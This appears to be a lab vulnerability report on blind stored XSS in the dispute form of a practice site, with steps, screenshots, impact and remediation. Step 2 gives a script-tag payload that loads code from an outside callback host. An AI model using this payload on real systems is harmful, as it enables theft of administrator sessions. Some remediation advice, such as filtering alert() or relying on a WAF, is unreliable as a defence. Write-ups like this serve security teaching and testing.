## Title
Blind XSS - DisputeDesk Dispute Resolution

## Description
**Affected URL:** https://disputedesk.pwnedbox.site/

The dispute submission form accepts user-controlled input in multiple fields, including Name, Phone, Company / merchant, Transaction reference, What happened, Desired resolution, and Evidence summary. The submitted values are stored and later displayed in the administrative interface. The screenshots show a dispute being submitted and subsequently appearing in the admin dashboard, along with an external XSS callback received through xss.report. This indicates a potential blind stored XSS vulnerability, where the payload is triggered when an administrator views the submitted case.

## Steps to Reproduce

1. Open the dispute submission page: https://disputedesk.pwnedbox.site/file.php
2. Enter the following payload into the Name field: `"><script src=https://xss.report/c/priyanshxop></script>`
3. Submit the dispute form. The same payload was also entered into other text fields shown in the screenshots.
4. Note the generated case reference after submission.
5. Open the administrative login page: https://disputedesk.pwnedbox.site/admin/login.php
6. Sign in using the lab-provided default credentials shown on the page.
7. Navigate to the admin dashboard and view the submitted case.
8. Observe that the submitted input is displayed in the case information.
9. Check the xss.report callback dashboard and verify that the external callback was received.


## POC (Proof of Concept)

**Screenshot 1:** Payload entered into multiple dispute form fields, including Name, Phone, Company / merchant, and Transaction reference.

<img width="1918" height="971" alt="image" src="https://github.com/user-attachments/assets/fb999526-4352-4745-94ee-c50b12291516" />

**Screenshot 2:** Payload entered into the What happened, Desired resolution, and Evidence summary fields before submitting the dispute.

<img width="1918" height="975" alt="image" src="https://github.com/user-attachments/assets/0427e9cc-4717-4666-86c2-b9f7f06f2140" />

**Screenshot 3:** Dispute successfully submitted and a case reference generated.

<img width="1918" height="963" alt="image" src="https://github.com/user-attachments/assets/cac79ca2-3a86-44b8-a41a-c275fc055564" />

**Screenshot 4:** Admin login page displaying the lab-provided default credentials.

<img width="1918" height="961" alt="image" src="https://github.com/user-attachments/assets/c6a145fd-6352-472b-aa9f-e51068d599c0" />

**Screenshot 5:** Admin dashboard showing the submitted case and reflected claimant input.

<img width="1918" height="957" alt="image" src="https://github.com/user-attachments/assets/495630ca-4ce9-4308-8e99-cf299994c6ca" />

**Screenshot 6:** xss.report callback evidence showing the received request and browser-side information.

<img width="1918" height="961" alt="image" src="https://github.com/user-attachments/assets/01835bea-bd35-4935-9e29-eb07119962e2" />

<img width="1918" height="951" alt="image" src="https://github.com/user-attachments/assets/5d537328-b887-40fb-96c6-72486203bcab" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.


## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
